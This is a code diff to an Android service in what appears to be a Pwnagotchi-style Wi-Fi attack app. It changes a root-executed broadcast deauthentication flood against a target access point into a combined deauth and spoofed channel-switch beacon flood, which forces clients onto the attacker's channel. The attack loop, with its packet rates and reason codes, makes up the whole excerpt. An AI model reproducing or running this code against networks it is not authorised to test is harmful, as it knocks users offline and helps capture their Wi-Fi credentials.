@@ -210,17 +210,17 @@ public class PwngService extends Service {
         
         for (pass = 1; pass <= PASSES && !caught && isRunning; pass++) {
             try {
-                // ── Phase 1: Dense deauth with rotating reason codes ──
+                // ── Phase 1: CSA deauth flood with rotating reason codes ──
                 if (deauth) {
                     int reason = REASONS[(pass - 1) % REASONS.length];
-                    brain.currentStatus = "👊 deauth " + ssid + " (pass " + pass + "/" + PASSES + " r" + reason + ")";
+                    brain.currentStatus = "👊 CSA deauth " + ssid + " (pass " + pass + "/" + PASSES + " r" + reason + ")";
                     updateNotification();
                     long deauthEnd = System.currentTimeMillis() + DEAUTH_SEC * 1000L;
                     while (System.currentTimeMillis() < deauthEnd && isRunning) {
-                        // Each call sends 5 packets (50ms apart) = 25 packets/sec total
-                        execSu("/data/data/com.pwnagotchi.app/deauth " + IFACE + " " + bssid
-                               + " ff:ff:ff:ff:ff:ff " + freq + " " + reason);
-                        sleep(200);  // 5 invocations/sec × 5 packets = 25 deauth/sec
+                        // beacon_flood: sends 10x (deauth + CSA beacon forcing client to our channel)
+                        execSu("/data/data/com.pwnagotchi.app/beacon_flood " + IFACE + " " + bssid
+                               + " \"" + ssid.replace("\"","\\\"") + "\" " + freq + " " + freq + " " + reason);
+                        sleep(600);  // each call takes ~500ms internally
                     }
                 }
                 
